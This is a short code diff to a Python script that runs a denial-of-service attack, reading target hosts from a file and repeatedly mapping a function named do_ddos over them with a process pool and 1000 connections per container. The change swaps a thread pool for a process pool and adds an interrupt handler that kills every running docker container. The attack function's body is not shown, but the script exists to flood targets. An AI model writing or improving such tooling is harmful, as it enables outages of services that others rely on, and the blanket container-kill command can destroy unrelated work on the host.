@@ -1,7 +1,7 @@
 import os
 import subprocess
 import sys
-from multiprocessing.pool import ThreadPool
+from multiprocessing.pool import Pool
 
 INTERVAL_BETWEEN_PING = '10m'
 CONNECTIONS_PER_CONTAINER = '1000'
@@ -18,8 +18,12 @@ def main():
     hosts_file_name = _parse_argv()
     hosts = _hosts_from_file(hosts_file_name)
     while True:
-        with ThreadPool(len(hosts)) as tp:
-            tp.map(do_ddos, hosts)
+        try:
+            with Pool(len(hosts)) as tp:
+                tp.map(do_ddos, hosts)
+        except KeyboardInterrupt:
+            os.system('docker kill $(docker ps -q)')
+            raise
 
 
 def do_ddos(host):
